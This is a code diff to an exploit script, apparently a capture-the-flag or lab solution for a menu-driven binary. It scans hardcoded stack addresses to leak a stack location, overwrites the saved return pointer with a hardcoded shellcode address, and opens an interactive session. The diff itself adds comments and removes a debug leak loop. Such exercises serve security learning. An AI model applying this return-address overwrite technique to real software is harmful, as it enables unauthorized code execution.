@@ -49,6 +49,8 @@ def main():
     r = conn()
     # Stack start
     case_e(r, b"6", b"A"*32)
+
+    # Loop through the stack
     for i in range(0x007ffffffde000,0x007ffffffff000,8):
         case_c(r, b"7", bytes(str(int(i)), "utf-8"))
         case_a(r, b"1")
@@ -65,12 +67,13 @@ def main():
             break
             
 
-
+    # use the found address
     print("Stack_addr:", hex(Stack_addr))
     offset = 0x7fffffffdcc8 - 0x7fffffffdb78
     print("Offsets:", hex(offset))
     Shellcode_addr = 0x7fffffffe0c5
     
+    # overwriting shellcode
     print("Found Ret ptr at " + hex(Stack_addr + offset))
     case_c(r, b"7", bytes(str(int(offset + Stack_addr)), "utf-8"))
     case_e(r, b"7", p64(Shellcode_addr))
@@ -78,20 +81,6 @@ def main():
     case_q(r)
 
     r.interactive()
-    
-    case_a(r, b"1")
-    case_a(r, b"7")
-    case_f(r)
-    for i in range(Stack_addr,Stack_addr+0x1000,8):
-        case_c(r, b"7", bytes(str(int(i)), "utf-8"))
-        case_a(r, b"1")
-        case_a(r, b"7")
-        case_f(r)
-        r.recvuntil(b"Salt (")
-        addr_bytes = r.recvn(8)              # always take exactly 8 bytes
-        addr = int.from_bytes(addr_bytes, "little")
-        print(f"{hex(addr)} Found at {hex(i)}")
-        print(hex(addr).encode() + b" Found at " + hex(i).encode())
 
 
 
